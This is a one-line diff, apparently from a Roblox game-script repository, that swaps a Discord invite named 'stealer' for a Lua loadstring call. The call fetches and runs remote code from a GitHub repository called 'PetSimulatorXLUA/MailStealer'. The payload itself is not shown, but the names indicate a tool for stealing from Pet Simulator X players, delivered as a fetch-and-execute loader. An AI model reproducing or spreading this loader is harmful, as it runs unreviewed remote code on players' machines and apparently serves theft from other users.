@@ -1,1 +1,1 @@
-discord.gg/stealer
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/PetSimulatorXLUA/MailStealer/main/Script'))()
